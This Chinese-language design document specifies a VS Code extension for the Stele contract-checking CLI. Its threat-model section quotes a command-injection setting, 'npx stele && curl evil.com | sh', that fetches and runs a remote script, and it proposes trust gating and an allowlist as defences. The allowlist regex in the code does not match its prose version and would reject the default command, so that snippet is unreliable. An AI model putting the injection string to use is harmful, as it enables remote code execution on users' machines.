# EP11 详细设计：VS Code 扩展 MVP

> PRD: [prd-phase-2.md §3](../../prd-phase-2.md) | 估算: 2-3 周 | 类别: IDE 扩展

## 1. 目标

让不用 AI agent 的 VS Code 用户也能用 Stele：语法高亮 + 一个命令 + 内联诊断 + 状态栏 + 1 个 Quick Fix。Tree View / LSP / Tree-sitter **不在范围**（推迟到 Phase 3）。

## 2. 包结构

```
packages/vscode-extension/
  package.json                       -- 扩展 manifest
  src/
    extension.ts                     -- activate / deactivate
    cliRunner.ts                     -- 调用 npx stele
    diagnostics.ts                   -- ViolationReport → vscode.Diagnostic
    commands/
      check.ts                       -- "Stele: Check"
    statusBar.ts                     -- 违约数 status bar item
    quickFix.ts                      -- Suppress in baseline action
  syntaxes/
    stele.tmLanguage.json            -- TextMate 文法
  resources/
    icon.svg
    icon-dark.svg
  README.md
  CHANGELOG.md
  __tests__/
    extension.test.ts
    diagnostics.test.ts
    grammar.test.ts                  -- vscode-tmgrammar-test
```

## 3. 扩展 manifest

`package.json`:

```json
{
  "name": "stele-vscode",
  "displayName": "Stele Contract Tools",
  "description": "Inline contract verification for repos using Stele",
  "version": "0.1.0",
  "publisher": "stelehq",
  "engines": { "vscode": "^1.85.0" },
  "categories": ["Linters", "Programming Languages"],
  "activationEvents": [
    "onLanguage:stele",
    "workspaceContains:**/stele.config.json"
  ],
  "main": "./dist/extension.js",
  "contributes": {
    "languages": [{
      "id": "stele",
      "extensions": [".stele"],
      "configuration": "./language-configuration.json"
    }],
    "grammars": [{
      "language": "stele",
      "scopeName": "source.stele",
      "path": "./syntaxes/stele.tmLanguage.json"
    }],
    "commands": [{
      "command": "stele.check",
      "title": "Stele: Check",
      "category": "Stele"
    }],
    "configuration": {
      "title": "Stele",
      "properties": {
        "stele.checkOnSave": {
          "type": "boolean",
          "default": true,
          "description": "Run stele check after each save"
        },
        "stele.checkOnSaveDebounceMs": {
          "type": "number",
          "default": 1000,
          "minimum": 100
        },
        "stele.cliCommand": {
          "type": "string",
          "default": "npx stele",
          "description": "Command to invoke Stele CLI"
        }
      }
    }
  },
  "scripts": {
    "build": "esbuild src/extension.ts --bundle --platform=node --target=node18 --outfile=dist/extension.js --external:vscode",
    "test": "vitest run __tests__"
  }
}
```

## 4. CLI 调用模型（含安全约束）

⚠️ **关键安全决定**：早期草稿用 `cp.spawn(cmd, args, { shell: true })` + 用户配置 `cliCommand` = 命令注入 vector。一个恶意 workspace 通过 `.vscode/settings.json` 设置 `"stele.cliCommand": "npx stele && curl evil.com | sh"`，在用户授予 workspace trust 时执行 RCE。

v0.2 安全防御：

1. **Workspace trust gate**：仅在 `vscode.workspace.isTrusted === true` 时执行 spawn；untrusted workspace 仅启用语法高亮等无副作用功能
2. **Drop `shell: true`**：直接传入 args 数组；npx Windows 兼容靠 Node 的 `npx.cmd` 解析
3. **cliCommand allowlist**：正则 `/^(npx |pnpm |yarn |stele$)/` 才接受；其他值被拒绝并提示用户

```typescript
// src/cliRunner.ts
import * as cp from "node:child_process";
import * as vscode from "vscode";

const CLI_COMMAND_ALLOWLIST = /^(npx |pnpm exec |yarn exec |stele)$/;

export interface CliResult {
  exitCode: number;
  stdout: string;
  stderr: string;
}

export class CliRunner {
  constructor(private cwd: string, private cliCommand: string) {
    if (!CLI_COMMAND_ALLOWLIST.test(cliCommand.trim())) {
      throw new Error(
        `Invalid stele.cliCommand "${cliCommand}". Must match: ${CLI_COMMAND_ALLOWLIST}.`
      );
    }
  }

  async checkAvailable(): Promise<boolean> {
    if (!vscode.workspace.isTrusted) return false;  // 不在 untrusted 中跑
    const r = await this.spawn(["--version"]);
    return r.exitCode === 0;
  }

  async run(args: string[]): Promise<CliResult> {
    if (!vscode.workspace.isTrusted) {
      throw new Error("Stele commands require workspace trust. Use 'Manage Workspace Trust' to enable.");
    }
    return this.spawn(args);
  }

  private spawn(args: string[]): Promise<CliResult> {
    return new Promise((resolve) => {
      // 不用 shell:true；按空格分隔 cliCommand 转 prefix args
      const parts = this.cliCommand.trim().split(/\s+/);
      const cmd = parts[0];  // 已通过 allowlist 校验
      const prefixArgs = parts.slice(1);
      // Windows 上 npx → 使用 npx.cmd（Node 自动解析）
      const child = cp.spawn(cmd, [...prefixArgs, ...args], { cwd: this.cwd, shell: false });
      let stdout = "", stderr = "";
      child.stdout.on("data", (d) => stdout += d);
      child.stderr.on("data", (d) => stderr += d);
      child.on("close", (code) => resolve({ exitCode: code ?? 1, stdout, stderr }));
      child.on("error", (err) => resolve({ exitCode: 1, stdout, stderr: `spawn failed: ${err.message}` }));
    });
  }
}
```

`packages/vscode-extension/SECURITY.md` 文档化威胁模型与缓解措施。

启动检查：

```typescript
// src/extension.ts
export async function activate(context: vscode.ExtensionContext) {
  const wsFolder = vscode.workspace.workspaceFolders?.[0];
  if (!wsFolder) return;

  const runner = new CliRunner(wsFolder.uri.fsPath, vscode.workspace.getConfiguration("stele").get("cliCommand", "npx stele"));
  const available = await runner.checkAvailable();
  if (!available) {
    vscode.window.showWarningMessage(
      "Stele CLI not found. Run `npm install --save-dev @stele/cli` in your project.",
    );
    // 仍激活：语法高亮等不依赖 CLI
  }

  // ... 注册命令、监听器、status bar 等
}
```

## 5. 内联诊断

```typescript
// src/diagnostics.ts
import * as vscode from "vscode";

export class SteleDiagnostics {
  private collection: vscode.DiagnosticCollection;

  constructor(private runner: CliRunner) {
    this.collection = vscode.languages.createDiagnosticCollection("stele");
  }

  async refresh(): Promise<void> {
    const result = await this.runner.run(["check", "--json"]);
    if (result.exitCode === 0) {
      this.collection.clear();
      return;
    }
    if (result.exitCode === 3) {
      vscode.window.showErrorMessage("Stele: manifest drift. Run `stele lock`.");
      this.collection.clear();
      return;
    }

    let report;
    try {
      report = JSON.parse(result.stdout);
    } catch {
      vscode.window.showErrorMessage(`Stele check failed: ${result.stderr.slice(0, 200)}`);
      return;
    }

    const byFile = new Map<string, vscode.Diagnostic[]>();
    // 真实 schema：rule_id（不是 invariant_id），location.path（不是 location.file），cause.detail 是 string
    for (const v of report.violations as Violation[]) {
      const file = v.location?.path;  // ← 真实字段名
      if (!file) continue;             // 没路径 → 跳过
      const line = (v.location?.line ?? 1) - 1;
      const witness = v.cause?.failure_witness;
      const witnessSummary = witness
        ? `\nWitness: index ${witness.failed_at_index} of ${witness.collection_size}`
        : "";
      const message = `[${v.rule_id}] ${v.cause.summary}${witnessSummary}`;
      const diag = new vscode.Diagnostic(
        new vscode.Range(line, 0, line, 1000),
        message,
        severityToVsCode(v.severity),
      );
      diag.source = "Stele";
      diag.code = v.rule_id;
      const arr = byFile.get(file) ?? [];
      arr.push(diag);
      byFile.set(file, arr);
    }

    this.collection.clear();
    for (const [file, diags] of byFile) {
      const uri = vscode.Uri.file(/* resolve relative to workspace */ join(this.runner.cwd, file));
      this.collection.set(uri, diags);
    }
  }

  dispose() { this.collection.dispose(); }
}

function severityToVsCode(s: Violation["severity"]): vscode.DiagnosticSeverity {
  switch (s) {
    case "error": return vscode.DiagnosticSeverity.Error;
    case "warning": return vscode.DiagnosticSeverity.Warning;
    case "info": return vscode.DiagnosticSeverity.Information;
  }
}
```

触发：

- `vscode.workspace.onDidSaveTextDocument`（带 debounce）
- 命令面板 `Stele: Check`

## 6. Quick Fix

```typescript
// src/quickFix.ts
import * as vscode from "vscode";

export class SteleQuickFixProvider implements vscode.CodeActionProvider {
  static metadata = { providedCodeActionKinds: [vscode.CodeActionKind.QuickFix] };

  provideCodeActions(
    document: vscode.TextDocument,
    range: vscode.Range,
    context: vscode.CodeActionContext,
  ): vscode.CodeAction[] {
    const steleDiagnostics = context.diagnostics.filter((d) => d.source === "Stele");
    if (steleDiagnostics.length === 0) return [];

    const actions: vscode.CodeAction[] = [];
    for (const diag of steleDiagnostics) {
      const action = new vscode.CodeAction(
        `Suppress "${diag.code}" in baseline`,
        vscode.CodeActionKind.QuickFix,
      );
      action.command = {
        command: "stele.suppressInBaseline",
        title: "Suppress in baseline",
        arguments: [diag.code, document.uri.fsPath],
      };
      action.diagnostics = [diag];
      actions.push(action);
    }
    return actions;
  }
}
```

注册命令：

```typescript
context.subscriptions.push(
  vscode.commands.registerCommand("stele.suppressInBaseline", async (invariantId: string, file: string) => {
    const reason = await vscode.window.showInputBox({ prompt: `Reason to suppress ${invariantId}?` });
    if (!reason) return;
    const result = await runner.run(["baseline-update", "--reason", reason]);
    if (result.exitCode !== 0) {
      vscode.window.showErrorMessage(`Stele: baseline update failed: ${result.stderr}`);
      return;
    }
    vscode.window.showInformationMessage(`Suppressed ${invariantId}.`);
    await diagnostics.refresh();
  }),
);
```

## 7. Status Bar

```typescript
// src/statusBar.ts
export class SteleStatusBar {
  private item: vscode.StatusBarItem;

  constructor() {
    this.item = vscode.window.createStatusBarItem(vscode.StatusBarAlignment.Right, 100);
    this.item.command = "stele.check";
    this.item.show();
    this.update(0);
  }

  update(violations: number): void {
    if (violations === 0) {
      this.item.text = `$(shield) Stele: ✓`;
      this.item.tooltip = "No contract violations";
      this.item.backgroundColor = undefined;
    } else {
      this.item.text = `$(shield) Stele: ${violations}`;
      this.item.tooltip = `${violations} contract violation${violations > 1 ? "s" : ""}`;
      this.item.backgroundColor = new vscode.ThemeColor("statusBarItem.errorBackground");
    }
  }
}
```

## 8. TextMate 语法

`syntaxes/stele.tmLanguage.json`:

```json
{
  "$schema": "https://raw.githubusercontent.com/martinring/tmlanguage/master/tmlanguage.json",
  "scopeName": "source.stele",
  "name": "stele",
  "patterns": [
    { "include": "#comment" },
    { "include": "#string" },
    { "include": "#number" },
    { "include": "#keyword-decl" },
    { "include": "#keyword-field" },
    { "include": "#operator" },
    { "include": "#severity-keyword" },
    { "include": "#identifier" }
  ],
  "repository": {
    "comment": {
      "name": "comment.line.semicolon.stele",
      "match": ";.*$"
    },
    "string": {
      "name": "string.quoted.double.stele",
      "begin": "\"",
      "end": "\"",
      "patterns": [{ "match": "\\\\.", "name": "constant.character.escape.stele" }]
    },
    "number": {
      "name": "constant.numeric.stele",
      "match": "-?\\b\\d+(\\.\\d+)?([eE][+-]?\\d+)?\\b"
    },
    "keyword-decl": {
      "name": "keyword.declaration.stele",
      "match": "\\b(metadata|import|operator|checker|group|invariant|scenario|boundary|class-shape|function-shape|type-policy|file-policy)\\b"
    },
    "keyword-field": {
      "name": "support.type.field.stele",
      "match": "\\b(severity|description|category|tags|when|tolerance|depends-on|rationale|since|applies-to|assert|uses-checker)\\b"
    },
    "operator": {
      "name": "keyword.operator.stele",
      "match": "\\b(forall|exists|where|none|and|or|not|implies|iff|when|if|eq|neq|gt|gte|lt|lte|in|matches|add|sub|mul|div|neg|abs|sum|count|avg|min|max|distinct|within|after|before|modified|state-before|state-after|exists-in|unique|not-null|between|approx-eq|contains|is-empty|starts-with|ends-with|has-length|length|concat|sort-by|sort-by-desc|mod|pow|round|ceil|floor|trim|lower|upper|split|join|type-of|map|first|last|filter|max-by|min-by|unique-by|contains-all|contains-any)\\b"
    },
    "severity-keyword": {
      "name": "constant.language.severity.stele",
      "match": ":(critical|high|medium|low|error|warning|info)\\b"
    },
    "identifier": {
      "name": "variable.other.stele",
      "match": "[a-zA-Z_][a-zA-Z0-9_-]*"
    }
  }
}
```

`language-configuration.json`:

```json
{
  "comments": { "lineComment": ";" },
  "brackets": [["(", ")"]],
  "autoClosingPairs": [{ "open": "(", "close": ")" }, { "open": "\"", "close": "\"" }],
  "surroundingPairs": [["(", ")"], ["\"", "\""]]
}
```

## 9. TextMate 测试

`__tests__/grammar.test.ts` 用 `vscode-tmgrammar-test`:

```bash
# 测试 fixture
__tests__/fixtures/grammar/
  invariant.stele
  invariant.tokens.json   # expected token types per char
```

CI 调 `vscode-tmgrammar-test --grammar syntaxes/stele.tmLanguage.json __tests__/fixtures/grammar/`。目标 ≥ 95% token 类型正确。

## 10. 发布到 Marketplace

前置：[Phase 0 §4.2.5](../../prd-phase-0.md) 已完成 Microsoft publisher 占名。

```bash
pnpm --filter stele-vscode build
cd packages/vscode-extension
vsce package          # 产出 .vsix
vsce publish 0.1.0    # 升级 placeholder 0.0.1 → 0.1.0
```

CI workflow `publish-vscode.yml`：手动触发；不并入 npm 发布流程。

## 11. 测试

```typescript
// __tests__/extension.test.ts
describe("VS Code extension", () => {
  it("activates without crash when stele.config.json present", async () => { /* mock workspace */ });
  it("shows warning when stele CLI not available", async () => { /* mock CliRunner */ });
});

// __tests__/diagnostics.test.ts
describe("SteleDiagnostics", () => {
  it("populates diagnostics from violation report", async () => { /* ... */ });
  it("includes witness summary in message", async () => { /* ... */ });
  it("clears on successful check", async () => { /* ... */ });
});
```

E2E 通过 `@vscode/test-electron`（参考 vscode 官方扩展模板），在 CI headless 跑。

## 12. 估算分解

| 工作 | 估算 |
|---|---|
| 包 scaffold + manifest + activate | 1 天 |
| TextMate 语法 + 测试 | 2 天 |
| `Stele: Check` 命令 | 1 天 |
| Diagnostics + onDidSaveTextDocument | 2 天 |
| Status bar | 0.5 天 |
| Quick Fix (suppress in baseline) | 1 天 |
| 配置项处理 | 0.5 天 |
| 测试 (vitest + tmgrammar) | 2 天 |
| Marketplace 发布 + README + screenshots | 1 天 |
| **合计** | **11 天 ≈ 2.5 周（1 FTE）/ 1.5 周（2 FTE）**|

## 13. 验收标准（来自 PRD §3.6）

- [ ] `.stele` 文件正确语法高亮（`vscode-tmgrammar-test` ≥ 95% token）
- [ ] `Stele: Check` 命令在 Command Palette 出现并可执行
- [ ] 违约显示为内联诊断，hover 显示 rule_id + cause.summary + witness 摘要（v0.2 真实 schema）
- [ ] Quick Fix "Suppress in baseline" 工作
- [ ] 状态栏显示违约总数（实时更新）
- [ ] 无 LSP 依赖（无 Tree View、无 goto-def，**这是有意为之**）
- [ ] 扩展在 VS Code Marketplace 列出（升级 0.0.1 → 0.1.0），icon 与 README 完整
